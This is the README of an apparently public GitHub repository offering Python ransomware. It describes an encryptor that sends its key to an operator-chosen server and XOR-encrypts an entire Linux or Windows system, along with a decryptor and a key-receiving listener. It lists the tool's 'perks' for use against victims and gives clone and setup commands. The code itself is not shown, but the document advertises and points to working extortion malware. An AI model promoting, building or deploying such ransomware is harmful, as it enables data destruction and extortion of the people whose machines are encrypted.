# ransomware-python3
Ransomware made with python3

-The ransomware doesn't rely on third party libs, so all you need from the victim machine is just a regular python3 installation ;)

-How the encryption process works:
  
  -the script opens a file in bits format and it already has the key in bits format and then it XORs the bits together and gives out the encrypted result and overwrite the file.

This repo consists of three files:
  
1-the encryptor file:
  
  -it generates a 512-bit key and initiates a connection to a server that you specify in the file.
    
  -then it initiates a connection to a server that you specify in the file and sends the key to the server.
    
  -then it starts encrypting the whole system whether it's a linux or a windows system.
    
   -it relies on XOR encryption technique.

    
2-the decryptor file:
    
 -the file takes the key in hexadecimal format and decrypts the files.

3-the server file:
    
 -the listener that you will run and wait for the ransomware to send you the encryption key.



-Installation:
  
  1-

      git clone https://github.com/BiLLY-J03l/ransomware-python3.git

  2-
  
      chmod +x *


-DO NOT RUN THE ENCRYPTOR SCRIPT ON YOUR COMPUTER, USE A VIRTUAL MACHINE!

-The perks of the project:

  1-uses only os lib, socket lib, time lib (for debugging).
  
  2-uses XOR encryption via bitwise operations.
  
  3-you can modify the script to not encrypt certain folders (or extensions) which can come in handy.
  




-extra info:
  
  -if you encountered some difficulties in running one of the scripts on linux:

    apt install dos2unix
    dos2unix encryptor.py decryptor.py server.py 

  -to get the key in hex format to supply it to the decryptor.py file:

    cat enc_key.key | xxd -p

  
